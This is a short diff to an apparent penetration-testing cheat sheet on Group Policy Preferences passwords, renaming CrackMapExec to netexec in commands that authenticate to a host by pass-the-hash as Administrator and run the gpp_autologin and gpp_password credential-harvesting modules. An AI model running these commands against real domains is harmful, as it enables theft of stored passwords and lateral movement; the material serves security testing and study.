@@ -27,10 +27,10 @@ echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aS
     post/windows/gather/credentials/gpp
     ```
 
-* CrackMapExec modules
+* netexec modules
     ```powershell
-    cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin
-    cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password
+    nxc smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin
+    nxc smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password
     ```
 
 * [Get-GPPPassword](https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py)
